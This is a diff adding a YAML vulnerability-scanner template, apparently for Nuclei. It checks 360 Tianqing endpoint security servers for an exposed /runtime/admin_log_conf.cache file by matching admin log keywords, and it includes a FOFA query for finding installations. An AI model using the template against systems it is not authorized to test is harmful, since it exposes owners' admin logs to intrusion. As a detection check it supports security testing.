@@ -1,0 +1,30 @@
+id: qianxin-tianqing-info-disclosure
+
+info:
+  name: "360 天擎 runtime 信息泄露漏洞"
+  author: Co5mos
+  severity: critical
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="360天擎终端安全管理系统"
+  tags: 360 天擎
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/runtime/admin_log_conf.cache"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "TYPE_LOGIN"
+          - "SafeCtrlAdminOpLogLogic"
+          - "AuditAdminOpLogLogic"
+        condition: and
+
+      - type: status
+        status:
+          - 200
